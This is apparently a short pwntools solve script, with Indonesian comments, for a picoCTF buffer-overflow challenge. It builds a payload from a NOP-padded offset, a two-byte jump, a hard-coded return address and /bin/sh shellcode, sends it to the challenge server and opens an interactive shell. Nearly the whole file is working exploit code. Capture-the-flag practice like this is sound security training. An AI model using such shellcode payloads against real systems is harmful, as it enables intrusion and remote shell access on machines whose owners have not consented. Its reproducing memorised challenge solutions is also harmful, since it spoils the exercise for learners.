from pwn import *
exe = context.binary = ELF("./vuln")
r = process()
r = remote("saturn.picoctf.net",54319)
offset = 26
shellcode = b"\x90" * offset + b"\xeb\x04" # xeb 04 adalah perintah assembly untuk jmp 6
# jump 6 address ke depan, jadi kita skip p32(0x0805333b) dan menuju binsh
# saya tahu ini dari solver orang
# memang luas pwn ini
payload = shellcode + p32(0x0805333b) + asm(shellcraft.sh())
r.sendline(payload)
r.interactive()